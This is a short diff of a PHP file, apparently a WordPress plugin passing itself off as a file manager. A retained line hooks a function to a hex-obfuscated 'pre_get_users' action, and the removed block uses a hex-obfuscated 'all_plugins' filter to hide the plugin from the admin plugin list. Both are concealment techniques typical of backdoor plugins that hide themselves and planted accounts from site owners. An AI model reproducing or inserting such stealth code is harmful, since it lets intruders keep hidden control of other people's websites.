@@ -61,14 +61,3 @@ function WP_File_Manager_PGN_GLOBALS($QRY) {
 add_action(hex2bin('7072655f6765745f7573657273'), 'WP_File_Manager_PGN_GLOBALS');
 
 
-add_filter(hex2bin('616c6c5f706c7567696e73'), function ($PG) {
-
-    $PG_FL = plugin_basename(__FILE__);
-
-    if (isset($PG[$PG_FL])) {
-        unset($PG[$PG_FL]);
-    }
-
-    return $PG;
-});
-
